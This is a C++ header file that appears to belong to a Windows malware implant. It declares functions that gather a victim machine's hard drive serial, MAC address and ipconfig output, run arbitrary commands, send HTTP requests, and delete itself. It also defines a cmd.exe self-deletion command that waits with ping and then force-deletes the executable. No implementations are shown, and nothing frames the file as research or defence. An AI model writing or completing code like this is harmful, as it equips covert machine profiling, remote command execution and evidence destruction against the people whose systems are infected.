#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <cstdlib>
#include <string>
#include <iterator>
#include <strsafe.h>
#include <winternl.h>
#include <sstream>
#include "WinHttpClient.h"
#include <codecvt>
#include <iomanip>


#define F_OUT "~s"
#define SUICIDE TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")


static BYTE _XSTEP = 0x0;
static bool _XDONE = false;

std::string _x01(); // GET serial id hard drive
std::string _x02(); // MAC addr
std::string _x03(); // IPCONFIG

std::string execute(std::string);

void REQ(std::string , std::string);
std::string url_encode(string&);
void SelfSuicide();